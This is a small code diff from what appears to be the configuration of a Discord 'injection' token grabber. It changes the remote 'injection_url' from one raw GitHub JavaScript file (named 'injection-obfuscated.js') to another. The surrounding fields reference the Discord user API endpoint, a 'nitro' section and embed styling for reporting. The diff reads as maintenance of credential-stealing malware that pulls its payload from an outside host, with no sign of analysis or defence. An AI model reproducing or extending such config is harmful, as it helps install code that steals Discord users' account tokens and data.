@@ -15,7 +15,7 @@ const config = {
   embed_name: 'xoykeinjection', 
   embed_icon: 'https://ibb.co/bM6brd7X',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/keyosbuff/dinjection/refs/heads/main/x1x.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
